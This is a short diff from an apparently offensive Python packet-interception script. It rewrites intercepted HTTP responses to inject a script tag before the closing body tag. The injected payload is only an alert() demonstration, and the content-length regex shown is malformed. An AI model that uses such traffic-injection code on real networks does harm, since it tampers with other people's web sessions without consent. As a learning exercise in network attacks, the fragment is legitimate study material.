@@ -44,7 +44,8 @@ def process_packet(packet):
             print("[+] HTTP Response Inbound found:")
             print("===================================")
             #print(scapy_packet.show())
-            load = load.replace("</body>", "<script>alert('JS injection');</script></body>")
+            injection_code = "<script>alert('JS injection');</script>"
+            load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("?:Content-Length:\s)(\d*)", load)
             #separate regex into two groups using () brackets
             #first group is a non-capturing group; ?:
